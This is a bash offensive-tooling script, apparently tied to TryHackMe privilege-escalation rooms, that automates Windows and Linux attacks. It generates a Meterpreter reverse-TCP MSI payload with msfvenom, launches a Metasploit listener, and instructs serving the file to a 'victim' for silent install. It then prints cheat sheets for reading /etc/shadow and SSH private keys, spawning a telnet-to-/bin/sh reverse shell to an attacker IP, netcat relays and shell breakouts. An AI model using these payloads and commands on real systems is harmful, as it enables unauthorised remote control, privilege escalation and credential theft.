#!/bin/sh
#!/bin/bash
#!/usr/bin/sh
#!/usr/bin/bash
#!/usr/bin/env sh
#!/usr/bin/env bash
#!/data/data/com.termux/files/usr/bin/sh
#!/data/data/com.termux/files/usr/bin/bash
###############################################################
#                     Privilege Escalation                    #
#-Info--------------------------------------------------------#
#    Enter Your Target, Hack Him, and Get Markdown Report     #
#-About-------------------------------------------------------#
#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
#--╼▰[ Script Name ]-╼▰[ HacKingPro-PrivEscPro ]              #
#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
###############################################################
# CREDIT: To All World Creators free Scripts & Tools          #
# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
# GREAT SCRIPTS                                               #
# Location: Made With LOVE IN ISRAEL !                        #
###############################################################
#-Metadata----------------------------------------------------#
#--╼▰[ Version ]-╼▰[ 1.0.0 ]                                  #
#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
#--╼▰[ Created ]-╼▰[ 19-08-2022 ]                             #
#--╼▰[ Update ]-╼▰[ 30-09-2022 ]                              #
###############################################################

#------╼╼▰[ HacKingPro ]--╼▰ [ MetaSploit ]--╼▰ [ Listeners ]--╼▰ [ Windows ]
msfconsole_Winndows_Meterpreter_Reverse_TCP(){

  # Module options (exploit/multi/handler):
  # Payload options (windows/meterpreter/reverse_tcp):
  msfconsole -q -x "use multi/handler;
  set payload windows/meterpreter/reverse_tcp;
  set lhost ${localIP};
  set lport ${localPORT};
  run;"

  # [*] Starting reverse TCP handler on ${localIP}:${localPORT}
}
#--╼▰[ HacKingPro ]-╼▰ [ PrivEscPro ]-╼▰ [ Windows PrivEsc Arena ]-╼▰ [ https://tryhackme.com/room/windowsprivescarena ]
WindowsPrivEsc(){ clear;
  ifconfig | grep UP | awk '{print $1}' | tr ":" " "
  ifconfig | grep inet |  tr ":" " "
  echo "\n"
  read -p "    [ Enter Local IP ]--╼▰    " localIP
  read -p "    [ Enter Local PORT ]--╼▰    " localPORT
  read -p "    [ Enter Payload Name ]--╼▰    " PayloadNAME
  echo "\n"

  # Task 1  Connecting to TryHackMe network
  # Task 2  Deploy the vulnerable machine                     | xfreerdp /u:${targetUSER} /p:${targetPASSWORD} /cert:none /v:${targetIP] /port:${targetPORT}
  # How to connect with freerdp command
  # To connect to the remote desktop using xfreerdp, run a command of the form: 1
  # xfreerdp /f /u:${targetUSER} /p:${targetPASSWORD} /v:${targetIP}[:${targetPORT}]
  # Task 3  Registry Escalation - Autorun                     | msfconsole_Winndows_Meterpreter_Reverse_TCP

  # Task 4  Registry Escalation - AlwaysInstallElevated       |

  #     Detection --> Windows VM
  #     1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  #     2.From the output, notice that “AlwaysInstallElevated” value is 1.
  #     3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  #     4.From the output, notice that “AlwaysInstallElevated” value is 1.

  #     Exploitation --> AttaKing VM
  #     1. Open command prompt and type: msfconsole
  #     2. msfconsole_Winndows_Meterpreter_Reverse_TCP
  #     3. msfvenom -p windows/meterpreter/reverse_tcp lhost=${localIP} lport=${localPORT}  -f msi -o ${PayloadNAME}.msi
  #     4. Copy the generated file, setup.msi, to the Windows VM.
  echo "\n"
  echo "\n\n\t\t (0) - [ Open New Tab & Start Local Server ]--╼▰"
  echo "\t\t [try] - [ python3 -m http.server ]"
  echo "\t\t [try] - [ php -S ${localIP}:${localPORT} ]"
  echo "\t\t [try] - [ http-server -p ${localPORT} ]"
  echo "\n\n\t\t (1) - [ Open in Vicitim Browser ]--╼▰ http://${localIP}:${localPORT}/${PayloadNAME}.msi"
  echo "\n\n\t\t (2) - [ Download ]--╼▰ ${PayloadNAME}.msi"
  echo "\n\n\t\t (3) - [ Terminate Local Server ]--╼▰ http://${localIP}:${localPORT}"
  echo "\n\n\t\t (4) - [ Run ]--╼▰  ${PayloadNAME}.msi"
  echo "\n"


  echo "
  Windows VM
  1.Place ‘setup.msi’ in ‘C:\Temp’.
  2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi

  Enjoy your shell! :) "

  #------╼╼▰[ HacKingPro ]--╼▰ [ MetaSploit ]--╼▰ [ Payloads ]--╼▰ [ Windows ]--╼▰ [ TCP Meterpreter ]--╼▰ [ msi ]
  echo "\n\n\t\t x) Creating: [ Windows ]--╼▰ [ TCP Meterpreter ]--╼▰ [ ${PayloadNAME}.msi ] \n"
  msfvenom -p windows/meterpreter/reverse_tcp lhost=${localIP} lport=${localPORT}  -f msi -o ${PayloadNAME}.msi
  # If Python version returned above is 3.X
  # On Windows, try "python -m http.server" or "py -3 -m http.server"
  # If Python version returned above is 2.X
  echo "\n\n\t\t Start Local Listener \n\n"
  msfconsole_Winndows_Meterpreter_Reverse_TCP
  # python -m SimpleHTTPServer

  # Task 5  Service Escalation - Registry                     | msfconsole_Winndows_Meterpreter_Reverse_TCP
  # Task 6  Service Escalation - Executable Files             | msfconsole_Winndows_Meterpreter_Reverse_TCP
  # Task 7  Privilege Escalation - Startup Applications
  # Task 8  Service Escalation - DLL Hijacking
  # Task 9  Service Escalation - binPath
  # Task 10  Service Escalation - Unquoted Service Paths
  # Task 11  Potato Escalation - Hot Potato
  # Task 12  Password Mining Escalation - Configuration Files
  # Task 13  Password Mining Escalation - Memory
  # Task 14  Privilege Escalation - Kernel Exploits
}

#--╼▰[ HacKingPro ]-╼▰ [ PrivEscPro ]-╼▰ [ Linux PrivEsc Arena ]-╼▰ [ https://tryhackme.com/room/linuxprivescarena ]

## Cheat Sheet for Privilege Escalation Enumerations
LinuxPrivEsc(){
  echo "
  !! Enumeration is the Key.
  (Linux) privilege escalation is all about:
  [01] -- Collect - Enumeration, more enumeration and some more enumeration.
  [02] -- Process - Sort through data, analyse and prioritisation.
  [03] -- Search - Know what to search for and where to find the exploit code.
  [04] -- Adapt - Customize the exploit, so it fits. Not every exploit work for every system 'out of the box'.
  [05] -- Try - Get ready for (lots of) trial and error.
  "
  function_1(){
    echo "
    •• Linux Privilege Escalation Enumeration Cheat Sheet:
    -- id -- info on current user on linux
    -- cat /etc/shadow -- Prints All UserNames and Password Hashes
    -- hostname -- Provides Hostname
    -- cat /etc/issue
    -- cat /etc/*-release
    -- uname -a -- kernel version and architecture
    -- ps axu -- prints running processes and users running them in user readable format
    -- ip a -- tcp/ip config of all interfaces and shows all information
    -- /sbin/routeor/sbin/routel -- Routing Table
    -- ss -anp -- list all network connections and sessions
    -- grep -Hs iptables /etc/* -- looks for iptables commands
    -- cat /etc/iptables-backup -- Prints these rules
    -- /etc/cron.daily -- Daily Tasks
    -- /etc/cron.weekly -- Weekly Tasks
    -- cat /et/crontab -- system admin added tasks with potentially insecure permissions
    -- dpkg -l -- list installed packages
    -- yum list installed -- list installed packages on redhat linux
    -- find / -writable -type d 2>/dev/null -- looks for world writable directories o mount = prints all drives mounted
    -- cat/etc/fstab -- all drives mounted at boot time
    -- /bin/lsblk -- partition information, try to mount them if unmounted
    -- lsmod -- list loaded modules
    -- /sbin/modinfomodulename -- more info about module

    •• Windows Privilege Escalation Enumeration Cheat Sheet:
    -- net user -- includes info on other users
    -- hostname -- provideshostname
    -- systeminfo
    -- tasklist /SVC -- prints running processes not by privileged users
    -- ipconfig /all -- displays full config of all adapters
    -- routeprint -- printsroutingtables
    -- netstat -ano -- view all active tcp connections along with address/port number/process id
    -- netsh adv -- firewall show currentprofile = view current firewall profile if profile is on: netsh adv firewall firewall show rule name=all = show all firewall rules
    -- schtasks /query /fo LIST /v -- displays scheduled tasks and displays as a list with verbose output
    -- wmic product get name, version, vendor -- enumerate installed applications and versions installed by windows installer
    -- wmic qfe get Caption, Description, HotFixID, InstalledOn -- list system wide updates and when they were installed
    "
    }
  Recon_Nmap(){
  echo "
  ## Recon -- Nmap

  !! Always start with a stealthy scan to avoid closing ports.
  ## Syn-scan
  nmap -sS $targetIP
  ## Scan all ports, might take a while.
  nmap $targetIP -p-
  ## Service-version, default scripts, OS:
  nmap $targetIP -sV -sC -O -p 111,222,333
  ## Scan for UDP
  nmap $targetIP -sU
  unicornscan -mU -v -I $targetIP
  ## Connect to udp if one is open
  nc -u $targetIP 48772
  ## Monster scan
  nmap $targetIP -p- -A -T4 -sC
  "

}
  LinuxPrivEsc_1_Collect(){
    while true; do
    # LinuxPrivEsc Collect ~ Main Menu Statements
    clear
    echo "
      LinuxPrivEsc Collect ~ Main Menu
      ---------------------------------------------------------------------------------------------------------
      ## Info-sheet
      -- OS:
      -- Server:
      -- Kernel:
      -- Workgroup:
      -- Host name:
      -- Windows domain:
      -- DNS-Domain name:
      -- Services and ports:
      ---------------------------------------------------------------------------------------------------------
      # 1 | Operating System
      # 2 | Applications & Services
      # 3 | Communications & Networking
      # 4 | Confidential Information & Users
      # 5 | File Systems
      # 6 | Preparation & Finding Exploit Code
      ---------------------------------------------------------------------------------------------------------
      "
      read cmd
      case $cmd in
        1 ) # 1 | Operating System
        echo "
        ---------------------------------------------------------------------------------------------------------
        # 1 | Operating System
        ---------------------------------------------------------------------------------------------------------
        -- 11 -- Whats the distribution type? What version?
        -- 12 -- Whats the Kernel version? Is it 64-bit?
        -- 13 -- What can be learnt from the environmental variables?
        -- 14 -- Is there a printer?
        ---------------------------------------------------------------------------------------------------------

        -- 11 -- Whats the distribution type? What version?
        cat /etc/issue
        cat /etc/*-release
        cat /etc/lsb-release
        cat /etc/redhat-release

        -- 12 -- Whats the Kernel version? Is it 64-bit?
        cat /proc/version
        uname -a
        uname -mrs
        rpm -q kernel
        dmesg | grep Linux
        ls /boot | grep vmlinuz-

        -- 13 -- What can be learnt from the environmental variables?
        cat /etc/profile
        cat /etc/bashrc
        cat ~/.bash_profile
        cat ~/.bashrc
        cat ~/.bash_logout
        env
        set

        -- 14 -- Is there a printer?
        lpstat -a

        "
        ;;
        2 ) # 2 | Applications & Services
        echo "
        ---------------------------------------------------------------------------------------------------------
        # 2 | Applications & Services
        ---------------------------------------------------------------------------------------------------------
        -- 21 -- What services are running? Which service has which user privilege?
        -- 22 -- Which service(s) are been running by root? Of these services, which are vulnerable - its worth a double check!
        -- 23 -- What applications are installed? What version are they? Are they currently running?
        -- 24 -- Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
        -- 25 -- What jobs are scheduled?
        -- 26 -- Any plain text usernames and/or passwords?
        ---------------------------------------------------------------------------------------------------------

        -- 21 -- What services are running? Which service has which user privilege?
        top
        ps aux
        ps -ef
        cat /etc/service

        -- 22 -- Which service(s) are been running by root? Of these services, which are vulnerable - its worth a double check!
        ps aux | grep root
        ps -ef | grep root

        -- 23 -- What applications are installed? What version are they? Are they currently running?
        dpkg -l
        rpm -qa
        ls -alh /sbin/
        ls -alh /usr/bin/
        ls -alh /var/cache/yum/
        ls -alh /var/cache/apt/archivesO

        -- 24 -- Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
        cat /etc/syslog.conf
        cat /etc/chttp.conf
        cat /etc/lighttpd.conf
        cat /etc/cups/cupsd.conf
        cat /etc/inetd.conf
        cat /etc/apache2/apache2.conf
        cat /etc/my.conf
        cat /etc/httpd/conf/httpd.conf
        cat /opt/lampp/etc/httpd.conf
        ls -aRl /etc/ | awk \$1 ~ /^.*r.*/

        -- 25 -- What jobs are scheduled?
        crontab -l
        cat /etc/cron*
        cat /etc/at.deny
        cat /etc/crontab
        ls -al /etc/cron*
        cat /etc/at.allow
        cat /etc/cron.deny
        cat /etc/cron.allow
        cat /etc/anacrontab
        ls -alh /var/spool/cron
        ls -al /etc/ | grep cron
        cat /var/spool/cron/crontabs/root

        -- 26 -- Any plain text usernames and/or passwords?
        grep -i user [filename]
        grep -i pass [filename]
        $(echo '    grep -C 5 "password" [filename]')
        $(echo '    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla')


        "
        ;;
        3 ) # 3 | Communications & Networking
        echo "
        ---------------------------------------------------------------------------------------------------------
        # 3 | Communications & Networking
        ---------------------------------------------------------------------------------------------------------
        -- 31 -- System NIC(s) | Is it connected to another network?
        -- 32 -- Network Configuration Settings | What can you find out about this network? DHCP server? DNS server? Gateway?
        -- 33 -- What other users & hosts are communicating with the system?
        -- 34 -- Whats cached? IP and/or MAC addresses
        -- 35 -- Is packet sniffing possible? What can be seen? Listen to live traffic
        -- 36 -- Have you got a shell? Can you interact with the system?
        -- 37 -- Is port forwarding possible? Redirect and interact with traffic from another view
        -- 38 -- fpipe
        -- 39 -- ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
        -- 310 -- mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
        -- 311 -- Is tunnelling possible? Send commands locally, remotely
        ---------------------------------------------------------------------------------------------------------

        -- 31 -- System NIC(s) | Is it connected to another network?
        /sbin/ifconfig -a
        cat /etc/network/interfaces
        cat /etc/sysconfig/network

        -- 32 -- Network Configuration Settings | What can you find out about this network? DHCP server? DNS server? Gateway?
        hostname
        iptables -L
        dnsdomainname
        cat /etc/networks
        cat /etc/resolv.conf
        cat /etc/sysconfig/network

        -- 33 -- What other users & hosts are communicating with the system?
        lsof -i
        lsof -i :80
        grep 80 /etc/services
        netstat -antup
        netstat -antpx
        netstat -tulpn
        chkconfig --list
        chkconfig --list | grep 3:on
        last
        w

        -- 34 -- Whats cached? IP and/or MAC addresses
        arp -e
        route
        /sbin/route -nee

        -- 35 -- Is packet sniffing possible? What can be seen? Listen to live traffic
        # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
        tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21

        -- 36 -- Have you got a shell? Can you interact with the system?
        # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
        nc -lvp 4444    # Attacker. Input (Commands)
        nc -lvp 4445    # Attacker. Ouput (Results)
        telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!

        -- 37 -- Is port forwarding possible? Redirect and interact with traffic from another view
        rinetd
        http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch

        -- 38 -- fpipe
        # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
        FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

        -- 39 -- ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
        ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
        ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

        -- 310 -- mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
        mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
        mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
        mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)

        -- 311 -- Is tunnelling possible? Send commands locally, remotely
        ssh -D 127.0.0.1:9050 -N [username]@[ip]
        proxychains ifconfig

        "
        ;;
        4 ) # 4 | Confidential Information & Users
        echo '
        ---------------------------------------------------------------------------------------------------------
        # 4 | Confidential Information & Users
        ---------------------------------------------------------------------------------------------------------
        -- 41 -- Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
        -- 42 -- Some Sensitive Files?
        -- 43 -- Anything Interesting in the Home Directorie(s)
        -- 44 -- Search for any Passwords | in Scripts, Databases, Configuration Files or Log files! Default Paths and Locations for Passwords
        -- 45 -- User History | Is there any password in plain text? What have they been edting?
        -- 46 -- User Information
        -- 47 -- Private Key Information
        ---------------------------------------------------------------------------------------------------------

        -- 41 -- Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
        w
        id
        who
        last
        sudo -l
        cat /etc/sudoers
        cat /etc/passwd | cut -d:    # List of users
        grep -v -E "^#" /etc/passwd | awk -F: "$3 == 0 { print $1}"   # List of super users
        awk -F: "($3 == "0") {print}" /etc/passwd   # List of super users

        -- 42 -- Some Sensitive Files?
        cat /etc/passwd
        cat /etc/group
        cat /etc/shadow
        ls -alh /var/mail/

        -- 43 -- Anything "interesting" in the home directorie(s)? If its possible to access
        ls -ahlR /root/
        ls -ahlR /home/*

        -- 44 -- Search for any Passwords | in Scripts, Databases, Configuration Files or Log files! Default Paths and Locations for Passwords
        cat /root/anaconda-ks.cfg
        cat /var/apache2/config.inc
        cat /var/lib/mysql/mysql/user.MYD

        -- 45 -- User History | Is there any password in plain text? What have they been edting?
        cat ~/.php_history
        cat ~/.bash_history
        cat ~/.nano_history
        cat ~/.atftp_history
        cat ~/.mysql_history

        -- 46 -- User Information
        cat ~/.bashrc
        cat ~/.profile
        cat /var/mail/root
        cat /var/spool/mail/root

        -- 47 -- Private Key Information
        cat ~/.ssh/id_rsa
        cat ~/.ssh/id_dsa
        cat ~/.ssh/identity
        cat ~/.ssh/id_rsa.pub
        cat ~/.ssh/id_dsa.pub
        cat ~/.ssh/identity.pub
        cat /etc/ssh/ssh_config
        cat /etc/ssh/sshd_config
        cat /etc/ssh/ssh_host_key
        cat ~/.ssh/authorized_keys
        cat /etc/ssh/ssh_host_dsa_key
        cat /etc/ssh/ssh_host_rsa_key
        cat /etc/ssh/ssh_host_key.pub
        cat /etc/ssh/ssh_host_dsa_key.pub
        cat /etc/ssh/ssh_host_rsa_key.pub

        '
        ;;
        5 ) # 5 | File Systems
        echo '
        ---------------------------------------------------------------------------------------------------------
        # 5 | File Systems
        ---------------------------------------------------------------------------------------------------------
        -- 51 -- Which configuration files can be written in /etc/? Able to reconfigure a service?
        -- 52 -- What can be found in /var/ ?
        -- 53 -- Any settings/files (hidden) on website? Any settings file with database information?
        -- 54 -- Is there anything in the log file(s) (Could help with "Local File Includes"!)
        -- 55 -- If commands are limited, you break out of the "jail" shell?
        -- 56 -- How are file-systems mounted?
        -- 57 -- Are there any unmounted file-systems?
        -- 58 -- What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
        -- 59 -- find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
        -- 510 -- Where can written to and executed from? A few common places: /tmp, /var/tmp, /dev/shm
        -- 511 -- Any "problem" files? Word-writeable, "nobody" files
        ---------------------------------------------------------------------------------------------------------
        -- 51 -- Which configuration files can be written in /etc/? Able to reconfigure a service?
        ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
        ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
        ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
        ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

        find /etc/ -readable -type f 2>/dev/null                         # Anyone
        find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone

        -- 52 -- What can be found in /var/ ?
        ls -alh /var/log
        ls -alh /var/mail
        ls -alh /var/spool
        ls -alh /var/spool/lpd
        ls -alh /var/lib/pgsql
        ls -alh /var/lib/mysql
        cat /var/lib/dhcp3/dhclient.leases

        -- 53 -- Any settings/files (hidden) on website? Any settings file with database information?
        ls -alhR /var/www/
        ls -alhR /var/www/html/
        ls -alhR /srv/www/htdocs/
        ls -alhR /opt/lampp/htdocs/
        ls -alhR /usr/local/www/apache22/data/

        -- 54 -- Is there anything in the log file(s) (Could help with "Local File Includes"!)
        # http://www.thegeekstuff.com/2011/08/linux-var-log-files/
        cat /var/log/wtmp
        cat /var/run/utmp
        cat /var/log/secure
        cat /var/log/syslog
        cat /var/log/xferlog
        cat /var/log/faillog
        cat /var/log/lastlog
        cat /var/log/yum.log
        cat /var/log/messages
        cat /var/log/dpkg.log
        cat /var/log/auth.log
        cat /var/log/chttp.log
        ls -alh /var/lib/dhcp3/
        ls -alh /var/log/samba/
        ls -alh /var/log/proftpd/
        cat /var/log/cups/error_log
        ls -alh /var/log/postgresql/
        cat /var/log/httpd/error_log
        cat /var/log/httpd/error.log
        cat /var/webmin/miniserv.log
        cat /var/www/logs/access_log
        cat /var/www/logs/access.log
        cat /var/log/httpd/access_log
        cat /var/log/httpd/access.log
        cat /etc/httpd/logs/error_log
        cat /etc/httpd/logs/error.log
        cat /etc/httpd/logs/access_log
        cat /etc/httpd/logs/access.log
        cat /var/log/apache2/error_log
        cat /var/log/apache2/error.log
        cat /var/log/apache/access_log
        cat /var/log/apache/access.log
        cat /var/log/apache2/access_log
        cat /var/log/apache2/access.log
        cat /var/log/lighttpd/error.log
        cat /var/log/lighttpd/access.log
        cat /var/log/lighttpd/lighttpd.access.log
        cat /var/log/lighttpd/lighttpd.error.log
        # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp

        -- 55 -- If commands are limited, you break out of the "jail" shell?
        python -c 'import pty;pty.spawn("/bin/bash")'
        echo os.system('/bin/bash')
        /bin/sh -i

        -- 56 -- How are file-systems mounted?
        mount
        df -h

        -- 57 -- Are there any unmounted file-systems?
        cat /etc/fstab

        -- 58 -- What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
        find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
        find / -perm -4000 -type f 2>/dev/null   #
        find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
        find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

        find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
        for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in common places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

        -- 59 -- find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
        find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

        -- 510 -- Where can written to and executed from? A few common places: /tmp, /var/tmp, /dev/shm
        find / -writable -type d 2>/dev/null        # world-writeable folders
        find / -perm -222 -type d 2>/dev/null      # world-writeable folders
        find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

        find / -perm -o+x -type d 2>/dev/null    # world-executable folders

        find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders

        -- 511 -- Any "problem" files? Word-writeable, "nobody" files
        find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
        find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

        '
        ;;
        6 ) # 6 | Preparation & Finding Exploit Code
        echo '
        ---------------------------------------------------------------------------------------------------------
        # 6 | Preparation & Finding Exploit Code
        ---------------------------------------------------------------------------------------------------------
        -- 61 -- What development tools/languages are installed/supported?
        -- 62 -- How can files be uploaded?
        -- 63 -- Finding exploit code
        -- 64 -- Finding more information regarding the exploit
        ---------------------------------------------------------------------------------------------------------

        -- 61 -- What development tools/languages are installed/supported?
        find / -name perl*
        find / -name python*
        find / -name gcc*
        find / -name cc

        -- 62 -- How can files be uploaded?
        find / -name wget
        find / -name nc*
        find / -name netcat*
        find / -name tftp*
        find / -name ftp

        -- 63 -- Finding exploit code
        [@] -- http://www.exploit-db.com
        [@] -- http://1337day.com
        [@] -- http://www.securiteam.com
        [@] -- http://www.securityfocus.com
        [@] -- http://www.exploitsearch.net
        [@] -- http://metasploit.com/modules/
        [@] -- http://securityreason.com
        [@] -- http://seclists.org/fulldisclosure/
        [@] -- http://www.google.com

        -- 64 -- Finding more information regarding the exploit
        [@] -- http://www.cvedetails.com
        [@] -- http://packetstormsecurity.org/files/cve/[CVE]
        [@] -- http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
        [@] -- http://www.vulnview.com/cve-details.php?cvename=[CVE]
        '
        ;;
      esac
  done

}

  echo '

# 1 | Operating System

# 2 | Applications & Services

# 3 | Communications & Networking

# 4 | Confidential Information & Users


# 5 | File Systems


## 6 | Preparation & Finding Exploit Code

---------------------------------------------------------------------------------------------------------

'
}
LinuxPrivEsc_Checklist(){
  echo "
  Checklists
  Kernel and distribution release details

  # System Information:
  Hostname

  # Networking details:
  Current IP
  Default route details
  DNS server information

  # User Information:
  Current user details
  Last logged on users
  Shows users logged onto the host
  List all users including uid/gid information
  List root accounts
  Extracts password policies and hash storage method information
  Checks umask value
  Checks if password hashes are stored in /etc/passwd
  Extract full details for 'default' uid's such as 0, 1000, 1001 etc
  Attempt to read restricted files i.e. /etc/shadow
  List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
  Basic SSH checks

  # Privileged access:
  Which users have recently used sudo
  Determine if /etc/sudoers is accessible
  Determine if the current user has Sudo access without a password
  Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
  Is root's home directory accessible
  List permissions for /home/

  # Environmental:
  Display current $PATH
  Displays env information

  # Jobs/Tasks:
  List all cron jobs
  Locate all world-writable cron jobs
  Locate cron jobs owned by other users of the system
  List the active and inactive systemd timers

  # Services:
  List network connections (TCP & UDP)
  List running processes
  Lookup and list process binaries and associated permissions
  List inetd.conf/xined.conf contents and associated binary file permissions
  List init.d binary permissions
  Version Information (of the following):
  Sudo
  MYSQL
  Postgres
  Apache
  Checks user config
  Shows enabled modules
  Checks for htpasswd files
  View www directories
  Default/Weak Credentials:
  Checks for default/weak Postgres accounts
  Checks for default/weak MYSQL accounts

  # Searches:
  Locate all SUID/GUID files
  Locate all world-writable SUID/GUID files
  Locate all SUID/GUID files owned by root
  Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
  Locate files with POSIX capabilities
  List all world-writable files
  Find/list all accessible *.plan files and display contents
  Find/list all accessible *.rhosts files and display contents
  Show NFS server details
  Locate *.conf and *.log files containing keyword supplied at script runtime
  List all *.conf files located in /etc
  Locate mail
  Platform/software specific tests:
  Checks to determine if we're in a Docker container
  Checks to see if the host has Docker installed
  Checks to determine if we're in an LXC container
  "
}

List_Contents(){
  # Task 1  [Optional] Connecting to the TryHackMe network
  # Task 2  Deploy the vulnerable machine
  # Task 3  Privilege Escalation - Kernel Exploits
  # Task 4  Privilege Escalation - Stored Passwords (Config Files)
  # Task 5  Privilege Escalation - Stored Passwords (History)
  # Task 6  Privilege Escalation - Weak File Permissions
  # Task 7  Privilege Escalation - SSH Keys
  # Task 8  Privilege Escalation - Sudo (Shell Escaping)
  # Task 9  Privilege Escalation - Sudo (Abusing Intended Functionality)
  # Task 10  Privilege Escalation - Sudo (LD_PRELOAD)
  # Task 11  Privilege Escalation - SUID (Shared Object Injection)
  # Task 12  Privilege Escalation - SUID (Symlinks)
  # Task 13  Privilege Escalation - SUID (Environment Variables #1)
  # Task 14  Privilege Escalation - SUID (Environment Variables #2)
  # Task 15  Privilege Escalation - Capabilities
  # Task 16  Privilege Escalation - Cron (Path)
  # Task 17  Privilege Escalation - Cron (Wildcards)
  # Task 18  Privilege Escalation - Cron (File Overwrite)
  # Task 19  Privilege Escalation - NFS Root Squashing
}
